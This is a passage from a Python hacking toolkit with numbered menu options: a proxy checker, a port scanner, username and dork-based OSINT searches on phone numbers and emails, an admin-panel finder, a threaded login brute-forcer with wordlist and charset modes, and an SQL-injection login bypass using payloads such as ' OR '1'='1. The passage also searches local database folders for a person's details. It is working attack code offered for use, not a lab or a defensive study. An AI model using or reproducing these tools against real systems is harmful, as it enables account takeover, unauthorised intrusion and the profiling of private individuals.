                        return (proxy, False, None, proto)

                MAX_WORKERS = 100
                TIMEOUT = 5
                TEST_URL = "http://example.com"

                all_proxies = {}
                for proto, filename in proxy_files.items():
                    all_proxies[proto] = load_proxies(filename)
                    print(f"[i] Loaded {len(all_proxies[proto])} proxies for {proto}")

                print("\n[i] Checking proxies multithreaded...")
                with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                    future_to_proxy = {}
                    for proto, proxies in all_proxies.items():
                        for p in proxies:
                            fut = executor.submit(test_proxy_task, p, proto, TIMEOUT, TEST_URL)
                            future_to_proxy[fut] = p

                    total = len(future_to_proxy)
                    done_count = 0
                    for fut in as_completed(future_to_proxy):
                        proxy, ok, latency_ms, proto = fut.result()
                        done_count += 1
                        status = "OK" if ok else "FAIL"
                        lat_display = f"{latency_ms}ms" if latency_ms else ""
                        print(f"[{done_count}/{total}] [{proto}] {proxy} -> {status} {lat_display}")
                        proxies_store[proto].append({"proxy": proxy, "ok": ok, "latency_ms": latency_ms})

                print("\n[i] Summary (top 10 working proxies by protocol):")
                for proto, results in proxies_store.items():
                    working = [r for r in results if r["ok"]]
                    working_sorted = sorted(working, key=lambda x: x["latency_ms"] if x["latency_ms"] is not None else 9999)
                    print(f"\n{proto}: total {len(results)}, working {len(working)}")
                    for r in working_sorted[:10]:
                        print(f"    {r['proxy']} — {r['latency_ms']}ms")
                cont()

            elif select == '7':
                screen()
                services = {
                    "VKontakte": "https://vk.com/{}",
                    "Telegram": "https://t.me/{}",
                    "GitHub": "https://github.com/{}",
                    "Instagram": "https://www.instagram.com/{}",
                    "Twitter": "https://twitter.com/{}",
                }

                def check_service(url):
                    try:
                        response = requests.get(url, timeout=5, verify=False)
                        if response.status_code == 200:
                            return f"{g}[+]{w} {url}"
                        else:
                            return f"{r}[-]{w} {url}"
                    except requests.RequestException:
                        return f"{r}[-]{w} {url}"

                def check_nickname(nickname):
                    with concurrent.futures.ThreadPoolExecutor() as executor:
                        results = {service: executor.submit(check_service, url.format(nickname)) for service, url in services.items()}
                        return {service: result.result() for service, result in results.items()}

                nickname = input(f"{w}[{w}?{w}]{w} Enter username: ")
                results = check_nickname(nickname)

                print("\n=== Results ===\n")
                for service, result in results.items():
                    print(f"{service}: {result}")
                cont()

            elif select == '8':
                screen()
                print(f"{c}[{w}*{c}]{w} Port Scanner\n")
                
                protocols = {
                    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
                    80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 
                    3306: 'MySQL', 3389: 'RDP', 8080: 'HTTP Alt', 5900: 'VNC',
                    5432: 'PostgreSQL', 27017: 'MongoDB', 6379: 'Redis'
                }

                def scan_port(target_ip, port, timeout=1):
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                            sock.settimeout(timeout)
                            result = sock.connect_ex((target_ip, port))
                            if result == 0:
                                protocol = protocols.get(port, 'Unknown')
                                return port, protocol, True
                    except:
                        pass
                    return port, None, False

                def scan_ports(target_ip, start_port, end_port, max_threads=100):
                    open_ports = []
                    print(f"{w}[{w}*{w}]{w} Scanning {target_ip} from port {start_port} to {end_port}...")
                    print(f"{w}[{w}*{w}]{w} Using {max_threads} threads\n")
                    
                    with ThreadPoolExecutor(max_workers=max_threads) as executor:
                        futures = []
                        for port in range(start_port, end_port + 1):
                            future = executor.submit(scan_port, target_ip, port)
                            futures.append(future)
                        
                        completed = 0
                        total = end_port - start_port + 1
                        
                        for future in as_completed(futures):
                            port, protocol, is_open = future.result()
                            completed += 1
                            
                            if completed % 100 == 0:
                                print(f"{w}[{w}*{w}]{w} Progress: {completed}/{total} ports...")
                            
                            if is_open:
                                open_ports.append((port, protocol))
                                print(f"{g}[{w}+{g}]{w} Port {port} open | Protocol: {protocol}")
                    
                    return open_ports

                target_ip = safe_input(f"{w}[{w}?{w}]{w} Enter IP: ")
                
                try:
                    start_port = int(safe_input(f"{w}[{w}?{w}]{w} Enter start port: "))
                    end_port = int(safe_input(f"{w}[{w}?{w}]{w} Enter end port: "))
                except ValueError:
                    print(f"{r}[{w}!{r}]{w} Invalid port format!")
                    cont()
                    continue

                if start_port < 1 or end_port > 65535 or start_port > end_port:
                    print(f"{r}[{w}!{r}]{w} Invalid port range (1-65535)!")
                else:
                    try:
                        print(f"{w}[{w}*{w}]{w} Checking host availability {target_ip}...")
                        socket.gethostbyname(target_ip)
                        
                        open_ports = scan_ports(target_ip, start_port, end_port)
                        
                        print(f"\n{g}[{w}+{g}]{w} Scan completed!")
                        print(f"{g}[{w}+{g}]{w} Open ports found: {len(open_ports)}")
                        
                        if open_ports:
                            print(f"\n{w}Open ports:")
                            for port, protocol in sorted(open_ports):
                                print(f"  {g}•{w} Port {port}: {protocol}")
                        else:
                            print(f"{y}[{w}!{y}]{w} No open ports found")
                            
                    except socket.gaierror:
                        print(f"{r}[{w}!{r}]{w} Cannot resolve address {target_ip}")
                    except Exception as e:
                        print(f"{r}[{w}!{r}]{w} Scan error: {e}")
                
                cont()

            elif select == '9':
                screen()
                ua = UserAgent()

                phone_dorks = ['inurl:profile phone', 'inurl:contact "phone"', 'intitle:"contact" "phone number"']
                email_dorks = ['inurl:profile email', 'inurl:contact "email"', 'intitle:"contact" "email"']
                nickname_dorks = ['inurl:profile nickname', 'inurl:username "nickname"', 'intitle:"profile" "nickname"']

                def animate():
                    animation = ['/', '-', '|', '\\']
                    while not stop_event.is_set():
                        for frame in animation:
                            sys.stdout.write(f'\r{w}[{w}+{w}]{w} Searching... {frame}')
                            sys.stdout.flush()
                            time.sleep(0.2)

                def search_phone_info(phone_number):
                    search_queries = [f"{dork} {phone_number}" for dork in phone_dorks]
                    for query in search_queries:
                        global stop_event
                        stop_event = threading.Event()
                        search_thread = threading.Thread(target=animate)
                        search_thread.start()
                        try:
                            headers = {'User-Agent': ua.random}
                            for url in googlesearch(query, headers=headers):
                                stop_event.set()
                                print(f"{g}[{w}+{g}]{w} Found: {url}")
                            stop_event.set()
                        except:
                            stop_event.set()
                            print(f"{r}[{w}ERROR{r}]{w} Error")

                def search_email_info(email_address):
                    search_queries = [f"{dork} {email_address}" for dork in email_dorks]
                    for query in search_queries:
                        global stop_event
                        stop_event = threading.Event()
                        search_thread = threading.Thread(target=animate)
                        search_thread.start()
                        try:
                            headers = {'User-Agent': ua.random}
                            for url in googlesearch(query, headers=headers):
                                stop_event.set()
                                print(f"{g}[{w}+{g}]{w} Found: {url}")
                            stop_event.set()
                        except:
                            stop_event.set()
                            print(f"{r}[{w}ERROR{r}]{w} Error")

                def search_nickname_info(nickname):
                    search_queries = [f"{dork} {nickname}" for dork in nickname_dorks]
                    for query in search_queries:
                        global stop_event
                        stop_event = threading.Event()
                        search_thread = threading.Thread(target=animate)
                        search_thread.start()
                        try:
                            headers = {'User-Agent': ua.random}
                            for url in googlesearch(query, headers=headers):
                                stop_event.set()
                                print(f"{g}[{w}+{g}]{w} Found: {url}")
                            stop_event.set()
                        except:
                            stop_event.set()
                            print(f"{r}[{w}ERROR{r}]{w} Error")

                print(f'{w}[{w}1{w}]{w} Phone Number\n{w}[{w}2{w}]{w} Email\n{w}[{w}3{w}]{w} Nickname')
                num = input(f"{w}[{w}?{w}]{w} Select search type: ")
                if num == '1':
                    phone_number = input(f"{w}[{w}?{w}]{w} Enter phone number: ")
                    search_phone_info(phone_number)
                elif num == '2':
                    email_address = input(f"{w}[{w}?{w}]{w} Enter e-mail: ")
                    search_email_info(email_address)
                elif num == '3':
                    nickname = input(f"{w}[{w}?{w}]{w} Enter username: ")
                    search_nickname_info(nickname)
                cont()

            elif select == '10':
                screen()
                try:
                    paths = [
                        "admin/", "admin/login/", "admin.php", "login/", "adminpanel/",
                        "wp-admin/", "administrator/", "admin1/", "cms/admin/", "cpanel/",
                        "backend/", "controlpanel/"
                    ]

                    target_site = input(f"{w}[{w}?{w}]{w} Enter URL to search admin panels: ").strip()
                    if not target_site:
                        print(f"{r}[{w}!{r}]{w} URL not entered.")
                    else:
                        if not target_site.startswith(("http://", "https://")):
                            base = "http://" + target_site
                        else:
                            base = target_site

                        found = []
                        for path in paths:
                            url = base.rstrip('/') + '/' + path
                            try:
                                resp = requests.get(url, timeout=5, verify=False)
                                if resp.status_code == 200:
                                    print(f"{g}[{w}+{g}]{w} Admin panel found: {url}")
                                    found.append(url)
                                elif resp.status_code == 403:
                                    print(f"{g}[{w}+{g}]{w} Admin panel found but no access: {url}")
                                else:
                                    print(f"{r}[{w}-{r}]{w} Not found: {url} (status {resp.status_code})")
                            except requests.RequestException:
                                print(f"{r}[{w}ERROR{r}]{w} Request error: {url}")
                        if found:
                            print(f"\n{g}[{w}+{g}]{w} Found {len(found)} panels:")
                            for i, u in enumerate(found, 1):
                                print(f"  {i}. {u}")
                        else:
                            print(f"{r}[{w}-{r}]{w} No admin panels found.")
                except Exception as e:
                    print(f"{r}[{w}ERROR{r}]{w} Error: {e}")
                cont()
            elif select == '11':
                screen()
                print(f"{c}[{w}*{c}]{w} Real Bruteforce Attack\n")
    
                import itertools
                import string
                import threading
                from concurrent.futures import ThreadPoolExecutor
                import glob
                import os
    
                class TerminatorBruteforce:
                    def __init__(self):
                        self.found = False
                        self.attempts = 0
                        self.start_time = None
                        self.session = requests.Session()
                        self.session.verify = False
                        self.lock = threading.Lock()
        
                    def get_charset(self, choice):
                        charsets = {
                            '1': (string.digits, "Digits only (0-9)"),
                            '2': (string.ascii_lowercase, "Lowercase letters only"),
                            '3': (string.ascii_uppercase, "Uppercase letters only"),
                            '4': (string.ascii_letters, "All letters (lower+upper)"),
                            '5': (string.digits + string.ascii_lowercase, "Digits + lowercase letters"),
                            '6': (string.digits + string.ascii_uppercase, "Digits + uppercase letters"),
                            '7': (string.digits + string.ascii_letters, "Digits + all letters"),
                            '8': (string.digits + "!@#$%^&*", "Digits + special characters"),
                            '9': (string.digits + string.ascii_lowercase + "!@#$%^&*", "Digits + lowercase + special"),
                            '10': (string.digits + string.ascii_uppercase + "!@#$%^&*", "Digits + uppercase + special"),
                            '11': (string.digits + string.ascii_letters + "!@#$%^&*", "All characters"),
                            '12': (string.ascii_lowercase + string.ascii_uppercase, "Letters all cases (no digits)"),
                            '13': (string.ascii_lowercase + "!@#$%^&*", "Lowercase + special"),
                            '14': (string.ascii_uppercase + "!@#$%^&*", "Uppercase + special"),
                            '15': (string.ascii_letters + "!@#$%^&*", "All letters + special")
                        }
                        return charsets.get(choice, (string.digits, "Digits only (0-9)"))
        
                    def calculate_total_combinations(self, charset, min_length, max_length):
                        charset_size = len(charset)
                        total = 0
                        for length in range(min_length, max_length + 1):
                            total += charset_size ** length
                        return total
        
                    def generate_combinations(self, length, charset):
                        for combo in itertools.product(charset, repeat=length):
                            yield ''.join(combo)
        
                    def test_login(self, url, username, password):
                        if self.found:
                            return False
                
                        try:
                            payload = {'username': username, 'password': password}
                            headers = {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                
                            response = self.session.post(url, data=payload, headers=headers, timeout=1, allow_redirects=True)
                
                            if response.status_code in [200, 302, 303]:
                                if any(word in response.text.lower() for word in ['dashboard', 'welcome', 'success', 'logout']):
                                    return True
                                if not any(word in response.text.lower() for word in ['invalid', 'error', 'incorrect']):
                                    return True
                        except:
                            pass
                        return False
        
                    def load_dictionary_files(self):
                        dictionary_path = "wordlist"
                        
                        if not os.path.exists(dictionary_path):
                            os.makedirs(dictionary_path)
                            print(f"{y}[{w}!{y}]{w} Created directory '{dictionary_path}'")
                            return []
                        
                        search_pattern = os.path.join(dictionary_path, "*.txt")
                        dictionary_files = glob.glob(search_pattern)
                        
                        passwords = set()
                        total_files = 0
                        
                        print(f"{b}[{w}*{b}]{w} Searching for dictionary files in '{dictionary_path}'...")
                        
                        for file_path in dictionary_files:
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    file_passwords = [line.strip() for line in f if line.strip()]
                                    passwords.update(file_passwords)
                                    total_files += 1
                                    file_name = os.path.basename(file_path)
                                    print(f"{g}[{w}+{g}]{w} Loaded {len(file_passwords):,} passwords from {file_name}")
                            except Exception as e:
                                print(f"{r}[{w}-{r}]{w} Error reading {file_path}: {e}")
                        
                        if total_files > 0:
                            print(f"{g}[{w}+{g}]{w} Total: {len(passwords):,} unique passwords from {total_files} files")
                        else:
                            print(f"{r}[{w}-{r}]{w} No dictionary files (*.txt) found in '{dictionary_path}'")
                            print(f"{y}[{w}!{y}]{w} Add password files like: passwords.txt, rockyou.txt to '{dictionary_path}' folder")
                        
                        return list(passwords)
        
                    def dictionary_attack(self, url, username):
                        print(f"{b}[{w}*{b}]{w} Starting dictionary attack...")
                        
                        dictionary_passwords = self.load_dictionary_files()
                        
                        if not dictionary_passwords:
                            print(f"{y}[{w}!{y}]{w} No dictionary files found in 'wordlist' folder.")
                            return False
                        
                        print(f"{b}[{w}*{b}]{w} Testing {len(dictionary_passwords):,} dictionary passwords...\n")
                        
                        dictionary_passwords.sort(key=len)
                        
                        for i, password in enumerate(dictionary_passwords, 1):
                            if self.found:
                                return True
                            
                            self.attempts += 1
                            progress_percent = (i / len(dictionary_passwords)) * 100
                            sys.stdout.write(f"\rTrying: {password:<20} | Attempt: {self.attempts:<6} | Progress: {i}/{len(dictionary_passwords)} ({progress_percent:.1f}%)")
                            sys.stdout.flush()
                            
                            if self.test_login(url, username, password):
                                self.found = True
                                self.show_success(username, password)
                                return True
                            
                            if i % 10 == 0:
                                time.sleep(0.01)
                        
                        print(f"\n{r}[{w}-{r}]{w} Dictionary attack completed - no matches found")
                        return False
        
                    def common_passwords_attack(self, url, username):
                        common_passwords = [
                            '123456', 'password', '12345678', 'qwerty', '123456789',
                            '12345', '1234', '111111', '1234567', 'dragon',
                            '123123', 'baseball', 'abc123', 'football', 'monkey',
                            'letmein', '696969', 'shadow', 'master', '666666',
                            'qwertyuiop', '123321', 'mustang', '1234567890',
                            'michael', '654321', 'superman', '1qaz2wsx',
                            '7777777', '121212', '000000', 'qazwsx',
                            '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer',
                            'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer',
                            'harley', 'batman', 'andrew', 'tigger', 'sunshine',
                            'iloveyou', '2000', 'charlie', 'robert',
                            'thomas', 'hockey', 'ranger', 'daniel', 'starwars',
                            '112233', 'george', 'computer',
                            'michelle', 'jessica', 'pepper', '1111', 'zxcvbn',
                            '555555', '11111111', '131313', 'freedom', '777777',
                            'pass', 'maggie', '159753', 'aaaaaa',
                            'ginger', 'princess', 'joshua', 'cheese', 'amanda',
                            'summer', 'love', 'ashley', '6969', 'nicole',
                            'chelsea', 'matthew', 'access', 'yankees',
                            '987654321', 'dallas', 'austin', 'thunder', 'taylor',
                            'matrix', 'minecraft', 'admin', '123', '1234', '12345',
                            'password1', 'Password', 'P@ssw0rd', 'admin123'
                        ]
                        
                        print(f"{b}[{w}*{b}]{w} Testing {len(common_passwords)} common passwords...")
                        
                        for i, password in enumerate(common_passwords, 1):
                            if self.found:
                                return True
                            
                            self.attempts += 1
                            sys.stdout.write(f"\rTrying: {password:<20} | Attempt: {self.attempts}")
                            sys.stdout.flush()
                            
                            if self.test_login(url, username, password):
                                self.found = True
                                self.show_success(username, password)
                                return True
                        
                        print(f"\n{r}[{w}-{r}]{w} Common passwords attack completed - no matches found")
                        return False
        
                    def bruteforce_attack(self, url, username, charset, charset_name, min_length, max_length, threads):
                        print(f"\n{c}[{w}*{c}]{w} Bruteforce Attack - {charset_name}")
                        print(f"{c}[{w}*{c}]{w} Starting bruteforce...\n")
            
                        for length in range(min_length, max_length + 1):
                            if self.found:
                                break
                    
                            combinations_for_length = len(charset) ** length
                            print(f"\n{b}[{w}*{b}]{w} Length {length} ({combinations_for_length:,} combinations)")
                
                            with ThreadPoolExecutor(max_workers=threads) as executor:
                                futures = set()
                    
                                for password in self.generate_combinations(length, charset):
                                    if self.found:
                                        break
                        
                                    future = executor.submit(self.test_password, url, username, password)
                                    futures.add(future)
                                    
                                    if len(futures) >= threads * 2:
                                        done_futures = {f for f in futures if f.done()}
                                        futures -= done_futures
                    
                                for future in futures:
                                    if self.found:
                                        break
                                    future.result()

                    def multi_bruteforce_attack(self, url, username, min_length, max_length, threads):
                        charsets = [
                            (string.digits, "Digits only (0-9)"),
                            (string.ascii_lowercase, "Lowercase letters only"),
                            (string.ascii_uppercase, "Uppercase letters only"),
                            (string.ascii_letters, "All letters (lower+upper)"),
                            (string.digits + string.ascii_lowercase, "Digits + lowercase letters"),
                            (string.digits + string.ascii_uppercase, "Digits + uppercase letters"),
                            (string.digits + string.ascii_letters, "Digits + all letters"),
                            (string.digits + "!@#$%^&*", "Digits + special characters"),
                            (string.digits + string.ascii_lowercase + "!@#$%^&*", "Digits + lowercase + special"),
                            (string.digits + string.ascii_uppercase + "!@#$%^&*", "Digits + uppercase + special"),
                            (string.ascii_lowercase + string.ascii_uppercase, "Letters all cases (no digits)"),
                            (string.ascii_lowercase + "!@#$%^&*", "Lowercase + special"),
                            (string.ascii_uppercase + "!@#$%^&*", "Uppercase + special"),
                            (string.ascii_letters + "!@#$%^&*", "All letters + special"),
                            (string.digits + string.ascii_letters + "!@#$%^&*", "All characters")
                        ]
                        
                        for i, (charset, charset_name) in enumerate(charsets, 1):
                            if self.found:
                                break
                            
                            print(f"\n{c}[{w}*{c}]{w} Bruteforce Method {i}/{len(charsets)}: {charset_name}")
                            self.bruteforce_attack(url, username, charset, charset_name, min_length, max_length, threads)

                    def bruteforce_smooth(self, url, username, min_length=1, max_length=4, charset_choice='1', threads=10):
                        self.start_time = time.time()
                        self.attempts = 0
                        self.found = False
            
                        print(f"{y}[{w}*{y}]{w} Target: {url}")
                        print(f"{y}[{w}*{y}]{w} Username: {username}")
                        print(f"{y}[{w}*{y}]{w} Min Length: {min_length}")
                        print(f"{y}[{w}*{y}]{w} Max Length: {max_length}")
                        print(f"{y}[{w}*{y}]{w} Threads: {threads}")
            
                        if charset_choice == '16':
                            print(f"{y}[{w}*{y}]{w} Mode: DICTIONARIES ONLY")
                            print(f"{y}[{w}*{y}]{w} Dictionary folder: wordlist/")
                            
                            print(f"\n{c}[{w}*{c}]{w} Dictionary Attack from wordlist/ folder")
                            if self.dictionary_attack(url, username):
                                return
            
                            print(f"\n{c}[{w}*{c}]{w} Common Passwords Attack")
                            if self.common_passwords_attack(url, username):
                                return
            
                        elif charset_choice == '17':
                            print(f"{y}[{w}*{y}]{w} Mode: ALL BRUTEFORCE METHODS (no dictionaries)")
                            
                            print(f"\n{c}[{w}*{c}]{w} Common Passwords Attack")
                            if self.common_passwords_attack(url, username):
                                return
                            
                            print(f"\n{c}[{w}*{c}]{w} Multi-Method Bruteforce Attack")
                            self.multi_bruteforce_attack(url, username, min_length, max_length, threads)
                            
                        else:
                            charset, charset_name = self.get_charset(charset_choice)
                            
                            print(f"{y}[{w}*{y}]{w} Mode: BRUTEFORCE ONLY - {charset_name}")
                            print(f"{y}[{w}*{y}]{w} Charset size: {len(charset)} symbols")
                            
                            total_combinations = self.calculate_total_combinations(charset, min_length, max_length)
                            
                            combinations_per_second = 100
                            estimated_time_seconds = total_combinations / combinations_per_second
                            estimated_time_str = self.format_time(estimated_time_seconds)
                            
                            print(f"{y}[{w}*{y}]{w} Total combinations: {total_combinations:,}")
                            print(f"{y}[{w}*{y}]{w} Estimated time: {estimated_time_str}")
                            
                            print(f"\n{c}[{w}*{c}]{w} Common Passwords Attack")
                            if self.common_passwords_attack(url, username):
                                return
            
                            print(f"\n{c}[{w}*{c}]{w} Bruteforce Attack - {charset_name}")
                            self.bruteforce_attack(url, username, charset, charset_name, min_length, max_length, threads)
            
                        if not self.found:
                            self.show_failure()
        
                    def test_password(self, url, username, password):
                        if self.found:
                            return
                
                        with self.lock:
                            self.attempts += 1
                            current_attempt = self.attempts
            
                        if current_attempt % 1 == 0:
                            sys.stdout.write(f"\rTrying: {password} | Attempt: {current_attempt}")
                            sys.stdout.flush()
            
                        if self.test_login(url, username, password):
                            with self.lock:
                                if not self.found:
                                    self.found = True
                                    self.show_success(username, password)
                    
                    def show_success(self, username, password):
                        elapsed = time.time() - self.start_time
                        print(f"\n\n{g}[{w}+{g}]{w} {'='*50}")
                        print(f"{g}[{w}+{g}]{w} ACCESS GRANTED!")
                        print(f"{g}[{w}+{g}]{w} Username: {username}")
                        print(f"{g}[{w}+{g}]{w} Password: {password}")
                        print(f"{g}[{w}+{g}]{w} Attempts: {self.attempts}")
                        print(f"{g}[{w}+{g}]{w} Time: {elapsed:.1f}s")
                        print(f"{g}[{w}+{g}]{w} Speed: {self.attempts/elapsed:.1f} attempts/sec")
                        print(f"{g}[{w}+{g}]{w} {'='*50}")
        
                    def show_failure(self):
                        elapsed = time.time() - self.start_time
                        print(f"\n{r}[{w}-{r}]{w} Password not found")
                        print(f"{r}[{w}-{r}]{w} Attempts: {self.attempts}")
                        print(f"{r}[{w}-{r}]{w} Time: {elapsed:.1f}s")
        
                    def format_time(self, seconds):
                        if seconds < 60:
                            return f"{seconds:.1f} seconds"
                        elif seconds < 3600:
                            minutes = seconds / 60
                            return f"{minutes:.1f} minutes"
                        elif seconds < 86400:
                            hours = seconds / 3600
                            return f"{hours:.1f} hours"
                        else:
                            days = seconds / 86400
                            return f"{days:.1f} days"
    
                bruteforce = TerminatorBruteforce()
    
                url = safe_input(f"{w}[{w}?{w}]{w} Login URL: ")
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
    
                username = safe_input(f"{w}[{w}?{w}]{w} Username: ")
    
                print(f"\n{w}[{w}1{w}]{w}  Digits only (0-9)")
                print(f"{w}[{w}2{w}]{w}  Lowercase letters only")
                print(f"{w}[{w}3{w}]{w}  Uppercase letters only") 
                print(f"{w}[{w}4{w}]{w}  All letters (lower+upper)")
                print(f"{w}[{w}5{w}]{w}  Digits + lowercase letters")
                print(f"{w}[{w}6{w}]{w}  Digits + uppercase letters")
                print(f"{w}[{w}7{w}]{w}  Digits + all letters")
                print(f"{w}[{w}8{w}]{w}  Digits + special characters")
                print(f"{w}[{w}9{w}]{w}  Digits + lowercase + special")
                print(f"{w}[{w}10{w}]{w} Digits + uppercase + special")
                print(f"{w}[{w}11{w}]{w} All characters")
                print(f"{w}[{w}12{w}]{w} Letters all cases (no digits)")
                print(f"{w}[{w}13{w}]{w} Lowercase + special")
                print(f"{w}[{w}14{w}]{w} Uppercase + special")
                print(f"{w}[{w}15{w}]{w} All letters + special")
                print(f"{w}[{w}16{w}]{w} DICTIONARIES ONLY (wordlist + common)")
                print(f"{w}[{w}17{w}]{w} ALL BRUTEFORCE METHODS (1-15, no dictionaries)")

                charset_choice = safe_input(f"{w}[{w}?{w}]{w} Select method [1]: ", "1")
    
                try:
                    min_length = int(safe_input(f"{w}[{w}?{w}]{w} Min password length [1]: ", "1"))
                except:
                    min_length = 1
    
                try:
                    max_length = int(safe_input(f"{w}[{w}?{w}]{w} Max password length [64]: ", "64"))
                except:
                    max_length = 64
    
                try:
                    threads = int(safe_input(f"{w}[{w}?{w}]{w} Threads [1000]: ", "1000"))
                except:
                    threads = 1000
    
                print(f"\n{c}[{w}*{c}]{w} Starting attack sequence...")
    
                bruteforce.bruteforce_smooth(url, username, min_length, max_length, charset_choice, threads)
    
                cont()
                
            elif select == '12':
                screen()
                try:
                    injections = [
                        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
                        "' OR 1=1#", "' OR 1=1--", "' OR 1=1/*", "' OR ''='"
                    ]

                    admin_url = input(f"{w}[{w}?{w}]{w} Enter login page URL: ").strip()
                    if not admin_url:
                        print(f"{r}[{w}!{r}]{w} URL not entered.")
                    else:
                        username = input(f"{w}[{w}?{w}]{w} Enter username: ").strip() or "admin"
                        found_inj = None
                        for inj in injections:
                            try:
                                data = {'username': username, 'password': inj}
                                resp = requests.post(admin_url, data=data, timeout=5, verify=False)
                                if resp.status_code in (301, 302) or "login successful" in resp.text.lower():
                                    print(f"{g}[{w}+{g}]{w} SQL injection worked: {inj}")
                                    found_inj = inj
                                    break
                                else:
                                    print(f"{r}[{w}-{r}]{w} Injection failed: {inj}")
                            except requests.RequestException:
                                print(f"{r}[{w}ERROR{r}]{w} Connection error (injection: {inj})")

                        if found_inj:
                            print(f"{g}[{w}+{g}]{w} Access granted via SQL injection: {found_inj}")
                        else:
                            print(f"{r}[{w}-{r}]{w} SQL injections failed.")
                except Exception as e:
                    print(f"{r}[{w}ERROR{r}]{w} Error: {e}")
                cont()

            elif select == '13':
                screen()
                print("OSINT Search")
                
                try:
                    import phonenumbers
                    import phonenumbers.timezone
                    import phonenumbers.carrier  
                    import phonenumbers.geocoder
                    import whois
                    from fake_useragent import UserAgent
                except ImportError as e:
                    print(f"{r}[{w}-{r}]{w} Import error: {e}")
                    print(f"{y}[{w}!{y}]{w} Install: pip install phonenumbers python-whois fake-useragent")
                    cont()
                    continue

                def osint_get_domain_info(domain):
                    try:
                        domain_info = whois.whois(domain)
                        if not domain_info:
                            return "[-] WHOIS information unavailable or domain not found."

                        domain_name = domain_info.domain_name if domain_info.domain_name else 'N/A'
                        creation_date = domain_info.creation_date if domain_info.creation_date else 'N/A'
                        expiration_date = domain_info.expiration_date if domain_info.expiration_date else 'N/A'
                        registrant_name = domain_info.registrant_name if domain_info.registrant_name else 'N/A'
                        registrant_organization = domain_info.registrant_organization if domain_info.registrant_organization else 'N/A'
                        registrant_country = domain_info.registrant_country if domain_info.registrant_country else 'N/A'
                        name_servers = ", ".join(domain_info.name_servers) if domain_info.name_servers else 'N/A'

                        info = f"""
[+] Domain: {domain_name}
[+] Registered: {creation_date}
[+] Expires: {expiration_date}
[+] Owner: {registrant_name}
[+] Organization: {registrant_organization}
[+] Country: {registrant_country}
[+] DNS Servers: {name_servers}
"""
                        return info
                    except Exception as e:
                        return f"[-] Error getting domain info: {str(e)}"

                def osint_check_account_availability(nick):
                    urls = {
                        "Instagram": f"https://www.instagram.com/{nick}",
                        "TikTok": f"https://www.tiktok.com/@{nick}", 
                        "Twitter": f"https://twitter.com/{nick}",
                        "Facebook": f"https://www.facebook.com/{nick}",
                        "YouTube": f"https://www.youtube.com/@{nick}",
                        "Telegram": f"https://t.me/{nick}",
                        "VK": f"https://vk.com/{nick}",
                        "GitHub": f"https://github.com/{nick}",
                    }
                    results = []
                    ua = UserAgent()
                    for platform_name, url in urls.items():
                        try:
                            headers = {'User-Agent': ua.random}
                            response = requests.get(url, headers=headers, timeout=10, verify=False)
                            if response.status_code == 200:
                                results.append(f"{g}[+]{w} {platform_name}: {url}")
                            elif response.status_code == 404:
                                results.append(f"{r}[-]{w} {platform_name}: {url}")
                            else:
                                results.append(f"{y}[!]{w} {platform_name}: {url} - code {response.status_code}")
                        except:
                            results.append(f"{y}[!]{w} {platform_name}: {url} - error")
                    return "\n".join(results)

                def osint_search_by_ip_api(ip):
                    if not ip:
                        return "[!] IP address not entered."
                    url = f"http://ip-api.com/json/{ip}"
                    try:
                        response = requests.get(url, timeout=10, verify=False)
                        data = response.json()
                        if data.get("status") == "fail":
                            return f"[!] Error: {data.get('message', 'Unknown error')}"
                        else:
                            info = f"""
[+] IP: {data.get('query', 'N/A')}
[+] Country: {data.get('country', 'N/A')}
[+] City: {data.get('city', 'N/A')}
[+] Provider: {data.get('isp', 'N/A')}
[+] Organization: {data.get('org', 'N/A')}
[+] Timezone: {data.get('timezone', 'N/A')}
"""
                            return info
                    except:
                        return f"[!] Request error for IP {ip}"

                def osint_phone_lookup(phone):
                    try:
                        parsed_phone = phonenumbers.parse(phone, None)
                        if not phonenumbers.is_valid_number(parsed_phone):
                            return f"[!] Invalid phone number: {phone}"
                        
                        carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
                        country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
                        region = phonenumbers.geocoder.description_for_number(parsed_phone, "ru")
                        formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                        timezona = phonenumbers.timezone.time_zones_for_number(parsed_phone)
                        
                        info = f"""
[+] Number: {formatted_number}
[+] Country: {country}
[+] Region: {region}
[+] Carrier: {carrier_info if carrier_info else 'N/A'}
[+] Timezone: {timezona}
[+] Telegram: https://t.me/{phone.lstrip('+')}
[+] Whatsapp: https://wa.me/{phone.lstrip('+')}
"""
                        return info
                    except Exception as e:
                        return f"[!] Error processing number: {str(e)}"

                def osint_search_in_databases_category(folder, text):
                    if not text:
                        print(f"{r}[{w}!{r}]{w} No text entered for search.")
                        return
                    
                    if not os.path.exists(folder) or not os.path.isdir(folder):
                        print(f"{r}[{w}!{r}]{w} Folder not found: {folder}")
                        return
                    
                    print(f"{w}[{w}*{w}]{w} Searching '{text}' in {folder}...\n")
                    found_count = 0
                    file_count = 0
                    
                    for root, dirs, files in os.walk(folder):
                        for file in files:
                            file_path = os.path.join(root, file)
                            file_count += 1
                            
                            try:
                                if file_count % 10 == 0:
                                    print(f"{w}[{w}*{w}]{w} Processed files: {file_count}...")
                                
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    if text.lower() in content.lower():
                                        print(f"{g}[+]{w} Found in: {file_path}")
                                        found_count += 1
                            except Exception as e:
                                continue
                    
                    print(f"\n{g}[+]{w} Search completed!")
                    print(f"{g}[+]{w} Processed files: {file_count}")
                    print(f"{g}[+]{w} Matches found: {found_count}")

                def osint_search_all_files_and_print_results(search_keyword, root_folder="Database"):
                    found_count = 0
                    processed_files_count = 0
                    search_keyword_lower = search_keyword.lower()

                    if not search_keyword:
                        print(f"{r}[{w}!{r}]{w} Cannot search empty query.")
